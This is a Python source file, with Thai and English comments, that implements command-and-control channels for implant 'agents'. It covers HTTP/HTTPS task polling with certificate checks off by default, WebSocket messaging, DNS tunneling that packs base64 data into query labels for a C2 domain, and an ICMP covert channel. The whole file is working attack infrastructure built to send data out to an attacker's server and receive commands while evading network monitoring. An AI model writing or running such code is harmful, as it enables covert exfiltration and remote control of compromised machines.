"""
C2 Protocol Handlers
รองรับ multiple protocols สำหรับ C2 communication
"""

import asyncio
import aiohttp
import base64
import json
from typing import Dict, Any, Optional
from datetime import datetime
from core.logger import log

try:
    from scapy.all import IP, ICMP, TCP, UDP, DNS, DNSQR, send, sniff
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    log.warning("[C2Protocols] scapy not available. ICMP and DNS protocols disabled.")


class HTTPProtocol:
    """
    HTTP-based C2 communication
    """
    
    def __init__(self, server_url: str):
        """
        Initialize HTTP protocol
        
        Args:
            server_url: C2 server URL
        """
        self.server_url = server_url
        self.session = None
    
    async def initialize(self):
        """Initialize HTTP session"""
        self.session = aiohttp.ClientSession()
    
    async def send(self, agent_id: str, data: bytes) -> Dict:
        """
        Send data via HTTP POST
        
        Args:
            agent_id: Agent ID
            data: Data to send
        
        Returns:
            Response dict
        """
        try:
            if not self.session:
                await self.initialize()
            
            # Encode data
            encoded_data = base64.b64encode(data).decode()
            
            # Send POST request
            async with self.session.post(
                f"{self.server_url}/c2/command",
                json={
                    "agent_id": agent_id,
                    "data": encoded_data,
                    "timestamp": datetime.now().isoformat()
                },
                timeout=aiohttp.ClientTimeout(total=30)
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    return {"success": True, "data": result}
                else:
                    return {"success": False, "error": f"HTTP {response.status}"}
        
        except Exception as e:
            log.error(f"[HTTPProtocol] Send failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def receive(self, agent_id: str) -> Dict:
        """
        Receive data via HTTP GET
        
        Args:
            agent_id: Agent ID
        
        Returns:
            Response dict
        """
        try:
            if not self.session:
                await self.initialize()
            
            # Get pending tasks
            async with self.session.get(
                f"{self.server_url}/c2/tasks/{agent_id}",
                timeout=aiohttp.ClientTimeout(total=30)
            ) as response:
                if response.status == 200:
                    tasks = await response.json()
                    return {"success": True, "tasks": tasks}
                else:
                    return {"success": False, "error": f"HTTP {response.status}"}
        
        except Exception as e:
            log.error(f"[HTTPProtocol] Receive failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def close(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()


class HTTPSProtocol(HTTPProtocol):
    """
    HTTPS-based C2 communication (same as HTTP but with TLS)
    """
    
    def __init__(self, server_url: str, verify_ssl: bool = False):
        """
        Initialize HTTPS protocol
        
        Args:
            server_url: C2 server URL (https://)
            verify_ssl: Verify SSL certificate
        """
        super().__init__(server_url)
        self.verify_ssl = verify_ssl
    
    async def initialize(self):
        """Initialize HTTPS session"""
        connector = aiohttp.TCPConnector(ssl=self.verify_ssl)
        self.session = aiohttp.ClientSession(connector=connector)


class WebSocketProtocol:
    """
    WebSocket-based C2 communication (real-time)
    """
    
    def __init__(self, server_url: str):
        """
        Initialize WebSocket protocol
        
        Args:
            server_url: WebSocket server URL (ws:// or wss://)
        """
        self.server_url = server_url
        self.ws = None
    
    async def connect(self, agent_id: str):
        """
        Connect to WebSocket server
        
        Args:
            agent_id: Agent ID
        """
        try:
            session = aiohttp.ClientSession()
            self.ws = await session.ws_connect(
                f"{self.server_url}/c2/ws/{agent_id}"
            )
            log.success(f"[WebSocketProtocol] Connected for agent {agent_id}")
            return {"success": True}
        
        except Exception as e:
            log.error(f"[WebSocketProtocol] Connection failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def send(self, data: bytes) -> Dict:
        """
        Send data via WebSocket
        
        Args:
            data: Data to send
        
        Returns:
            Response dict
        """
        try:
            if not self.ws:
                return {"success": False, "error": "Not connected"}
            
            # Encode and send
            encoded_data = base64.b64encode(data).decode()
            await self.ws.send_json({
                "type": "data",
                "data": encoded_data,
                "timestamp": datetime.now().isoformat()
            })
            
            return {"success": True}
        
        except Exception as e:
            log.error(f"[WebSocketProtocol] Send failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def receive(self, timeout: int = 60) -> Dict:
        """
        Receive data via WebSocket
        
        Args:
            timeout: Receive timeout in seconds
        
        Returns:
            Response dict
        """
        try:
            if not self.ws:
                return {"success": False, "error": "Not connected"}
            
            # Receive with timeout
            msg = await asyncio.wait_for(
                self.ws.receive(),
                timeout=timeout
            )
            
            if msg.type == aiohttp.WSMsgType.TEXT:
                data = json.loads(msg.data)
                return {"success": True, "data": data}
            else:
                return {"success": False, "error": "Invalid message type"}
        
        except asyncio.TimeoutError:
            return {"success": False, "error": "Timeout"}
        except Exception as e:
            log.error(f"[WebSocketProtocol] Receive failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def close(self):
        """Close WebSocket connection"""
        if self.ws:
            await self.ws.close()


class DNSProtocol:
    """
    DNS tunneling for C2 communication
    """
    
    def __init__(self, domain: str, dns_server: str = "8.8.8.8"):
        """
        Initialize DNS protocol
        
        Args:
            domain: C2 domain for DNS queries
            dns_server: DNS server to use
        """
        self.domain = domain
        self.dns_server = dns_server
        
        if not SCAPY_AVAILABLE:
            log.error("[DNSProtocol] scapy not available")
    
    async def send(self, agent_id: str, data: bytes) -> Dict:
        """
        Send data via DNS queries
        
        Args:
            agent_id: Agent ID
            data: Data to send (will be chunked)
        
        Returns:
            Response dict
        """
        if not SCAPY_AVAILABLE:
            return {"success": False, "error": "scapy not available"}
        
        try:
            # Encode data
            encoded_data = base64.b64encode(data).decode()
            
            # Chunk data (DNS labels max 63 chars)
            chunk_size = 60
            chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
            
            # Send each chunk as DNS query
            for i, chunk in enumerate(chunks):
                query_domain = f"{agent_id}.{i}.{chunk}.{self.domain}"
                
                # Create DNS query
                dns_query = IP(dst=self.dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain))
                
                # Send query
                send(dns_query, verbose=0)
                
                # Small delay between chunks
                await asyncio.sleep(0.1)
            
            log.success(f"[DNSProtocol] Sent {len(chunks)} chunks via DNS")
            return {"success": True, "chunks_sent": len(chunks)}
        
        except Exception as e:
            log.error(f"[DNSProtocol] Send failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def receive(self, timeout: int = 60) -> Dict:
        """
        Receive data via DNS responses
        
        Args:
            timeout: Receive timeout in seconds
        
        Returns:
            Response dict with data
        """
        if not SCAPY_AVAILABLE:
            return {"success": False, "error": "scapy not available"}
        
        try:
            # Sniff DNS responses
            packets = sniff(
                filter=f"udp port 53 and host {self.dns_server}",
                count=1,
                timeout=timeout
            )
            
            if packets:
                # Extract data from DNS response
                # (Implementation depends on how data is encoded in responses)
                return {"success": True, "packets": len(packets)}
            else:
                return {"success": False, "error": "No packets received"}
        
        except Exception as e:
            log.error(f"[DNSProtocol] Receive failed: {e}")
            return {"success": False, "error": str(e)}


class ICMPProtocol:
    """
    ICMP-based C2 communication
    """
    
    def __init__(self, target_ip: str):
        """
        Initialize ICMP protocol
        
        Args:
            target_ip: Target IP address
        """
        self.target_ip = target_ip
        
        if not SCAPY_AVAILABLE:
            log.error("[ICMPProtocol] scapy not available")
    
    async def send(self, agent_id: str, data: bytes) -> Dict:
        """
        Send data via ICMP packets
        
        Args:
            agent_id: Agent ID
            data: Data to send
        
        Returns:
            Response dict
        """
        if not SCAPY_AVAILABLE:
            return {"success": False, "error": "scapy not available"}
        
        try:
            # Encode agent_id and data
            payload = f"{agent_id}:{base64.b64encode(data).decode()}"
            
            # Create ICMP packet with payload
            packet = IP(dst=self.target_ip) / ICMP() / payload.encode()
            
            # Send packet
            send(packet, verbose=0)
            
            log.success(f"[ICMPProtocol] Sent ICMP packet to {self.target_ip}")
            return {"success": True}
        
        except Exception as e:
            log.error(f"[ICMPProtocol] Send failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def receive(self, timeout: int = 60) -> Dict:
        """
        Receive data via ICMP packets
        
        Args:
            timeout: Receive timeout in seconds
        
        Returns:
            Response dict with data
        """
        if not SCAPY_AVAILABLE:
            return {"success": False, "error": "scapy not available"}
        
        try:
            # Sniff ICMP packets
            packets = sniff(
                filter="icmp",
                count=1,
                timeout=timeout
            )
            
            if packets and packets[0].haslayer(ICMP):
                # Extract payload
                payload = bytes(packets[0][ICMP].payload).decode()
                
                # Parse agent_id and data
                if ":" in payload:
                    agent_id, encoded_data = payload.split(":", 1)
                    data = base64.b64decode(encoded_data)
                    
                    return {
                        "success": True,
                        "agent_id": agent_id,
                        "data": data
                    }
            
            return {"success": False, "error": "No valid ICMP packets received"}
        
        except Exception as e:
            log.error(f"[ICMPProtocol] Receive failed: {e}")
            return {"success": False, "error": str(e)}


class C2ProtocolManager:
    """
    Manager for C2 protocols
    """
    
    def __init__(self):
        """Initialize protocol manager"""
        self.protocols = {}
    
    def register_protocol(self, name: str, protocol):
        """
        Register a protocol
        
        Args:
            name: Protocol name
            protocol: Protocol instance
        """
        self.protocols[name] = protocol
        log.info(f"[C2ProtocolManager] Registered protocol: {name}")
    
    def get_protocol(self, name: str):
        """
        Get protocol by name
        
        Args:
            name: Protocol name
        
        Returns:
            Protocol instance or None
        """
        return self.protocols.get(name)
    
    def list_protocols(self) -> list:
        """
        List all registered protocols
        
        Returns:
            List of protocol names
        """
        return list(self.protocols.keys())

